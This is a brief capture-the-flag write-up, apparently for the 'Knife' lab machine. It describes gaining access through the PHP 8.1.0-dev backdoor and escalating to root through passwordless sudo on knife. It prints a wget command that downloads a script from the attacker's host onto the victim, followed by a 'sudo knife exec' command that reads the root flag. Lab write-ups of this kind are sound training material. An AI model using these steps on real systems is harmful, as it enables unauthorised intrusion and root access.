# Knife

# PHP-8.1.0-dev Backdoor
Server has a vulnerabilty because of backdoor set by the hacker in the dev branch of php.  
Additional info can be found in this script: https://dl.packetstormsecurity.net/2105-exploits/php_8.1.0-dev.py.txt  
And that's what I've used.

# user.txt
Modified script for my needs (removed extra code and made infinite loop of commands) then read the `/home/james/user.txt`

# root.txt
Found `/usr/bin/knife` could be run with `sudo` with *no password*.   
Created a script called `read.rb` (see in this directory) that reads `/root/root.txt` and then downloaded it with `wget` to the victim machine:
```bash
wget http://my-ip:8000/read.rb -O /home/james/read.rb
```
I could've done this in smarted way, but let's leave this as it is.  
Then ran this:
````bash
sudo knife exec /home/james/read.rb
> *root flag*
```
